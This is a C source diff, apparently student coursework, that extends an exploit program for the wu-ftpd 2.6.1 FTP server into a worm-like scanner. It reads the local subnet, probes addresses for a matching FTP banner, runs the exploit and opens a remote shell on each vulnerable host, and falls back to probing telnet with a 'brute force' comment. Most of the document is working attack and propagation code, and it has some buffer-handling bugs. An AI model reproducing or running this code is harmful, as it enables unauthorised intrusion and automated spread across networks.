@@ -21,9 +21,14 @@
 #include <stdarg.h>
 #include <string.h>
 #include <time.h>
+#include <ifaddrs.h>
+
+#define IP_LENGTH 15
+#define BUFFER_SIZE 256
 
 void cshell (int sock);
 int exploiter(int argc, char *argv[]);
+char *showips();
 
 int main(int argc, char *argv[]) {
  
@@ -39,26 +44,89 @@ int main(int argc, char *argv[]) {
         printf("Ocorreu um erro no socket!\n");
         exit(1);    
     }
-    
-    vitima.sin_family = AF_INET;
-    vitima.sin_port = htons(21);
-    vitima.sin_addr.s_addr = inet_addr(argv[2]);
-    conexao = connect(meuSocket, (struct sockaddr * )&vitima, sizeof(vitima));
-    
-    if(conexao == -1) {
-        printf("Erro na conexao!\n");
-        exit(1); 
+
+    char *ip = malloc(IP_LENGTH*sizeof(char));
+
+    ip = showips();
+
+    // Isolate subnet from IP
+    int i = 0;
+    char *subnet = malloc(IP_LENGTH*sizeof(char));
+    char *token;
+    subnet[0] = '\0';
+    while (((token = strsep(&ip, ".")) != NULL) && i<3 ) {        
+        strcat(subnet, token);
+        strcat(subnet, ".");
+        i++;
     }
-    memset(buf, '\0', 200);
-    ret = recv(meuSocket, buf, 199, 0);
-    printf("O banner é: %s\n", buf);
-    printf("%p\n", strstr(buf,"220"));
-    if (strstr(buf,"220 redhat1 FTP server (Version wu-2.6.1-18) ready.") != NULL) {
-        printf("Esse é o banner\n");
-        fd = exploiter(argc, argv);
-        cshell(fd);
-        exit(1);
+
+    ip = malloc(IP_LENGTH*sizeof(char));
+    char *ips = malloc(3*sizeof(char));
+    for (int ipaddr=203; ipaddr<=254; ipaddr++) {
+
+        strcpy(ip, subnet);
+        sprintf(ips, "%d", ipaddr);
+        strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);
+
+        // printf("ip: %s\n", ip);
+
+        vitima.sin_family = AF_INET;
+        vitima.sin_port = htons(21);
+        vitima.sin_addr.s_addr = inet_addr(ip);
+        // conexao = connect(meuSocket, (struct sockaddr * )&vitima, sizeof(vitima));
+
+        printf("trying IP: %s\n", ip);
+        if (connect(meuSocket,(struct sockaddr *)&vitima,sizeof(vitima)) < 0) {
+            close(meuSocket);
+
+            if (errno == 51) { 
+                // Error 51 means network unreachable, IP inactive
+                // port = port_max;
+                printf("IP unreachable\n");
+            } // Other errors can be port inactive or operation timeout
+            printf("FTP printfort unreachable\n");
+            continue; 
+        }
+        
+
+        memset(buf, '\0', 200);
+        ret = recv(meuSocket, buf, 199, 0);
+        printf("O banner é: %s\n", buf);
+        if (strstr(buf,"220 redhat1 FTP server (Version wu-2.6.1-18) ready.") != NULL) {
+            int argc = 4;
+            char *argv[4] = {
+                "exploiter",
+                "-d",
+                ip,
+                "-a"
+            };
+
+            fd = exploiter(argc, argv);
+            cshell(fd);
+            exit(1);
+        } else {
+            // força bruta???
+            vitima.sin_port = htons(23);
+            printf("trying IP: %s\n", ip);
+
+            if (connect(meuSocket,(struct sockaddr *)&vitima,sizeof(vitima)) < 0) {
+                close(meuSocket);
+
+                if (errno == 51) { 
+                    // Error 51 means network unreachable, IP inactive
+                    // port = port_max;
+                    printf("IP unreachable\n");
+                } // Other errors can be port inactive or operation timeout
+                printf("Telnet port unreachable\n");
+                continue; 
+            }
+        }
+        
+
     }
+
+    exit(0);
+    
      
     if(ret == -1) {
         printf("Nao recebeu nada!\n\n"); 
@@ -132,6 +200,31 @@ void cshell (int sock) {
         //         write (1, buf, l);
         //     }
         // }
+}
+
+char *showips() {
+    struct ifaddrs *addrs;
+
+    getifaddrs(&addrs);
+    struct ifaddrs *tmp = addrs;
+
+    while (tmp) 
+    {
+        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET)
+        {
+            struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
+            if (strcmp("lo0", tmp->ifa_name)) {
+                printf("%s: %s\n", tmp->ifa_name, inet_ntoa(pAddr->sin_addr));
+                return inet_ntoa(pAddr->sin_addr);
+            }
+        }
+
+        tmp = tmp->ifa_next;
+    }
+
+    freeifaddrs(addrs);
+
+    return NULL;
 }
 
 // http://www.inf.ufpr.br/rdmgreca/sistdist/project1/relatorio/diag.c.txt
